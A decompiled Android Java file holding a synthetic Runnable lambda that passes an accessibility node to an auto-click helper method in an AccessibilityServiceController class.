/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.view.accessibility.AccessibilityNodeInfo
 */
package linker.resourcer.encoder;

import android.view.accessibility.AccessibilityNodeInfo;
import linker.resourcer.encoder.AccessibilityServiceController;

public final class AccessibilityServiceController$$ExternalSyntheticLambda26
implements Runnable {
    public final AccessibilityNodeInfo f$0;

    public /* synthetic */ AccessibilityServiceController$$ExternalSyntheticLambda26(AccessibilityNodeInfo accessibilityNodeInfo) {
        this.f$0 = accessibilityNodeInfo;
    }

    @Override
    public final void run() {
        AccessibilityServiceController.lambda$tryClickEnterByIdOrCoords$15(this.f$0);
    }
}

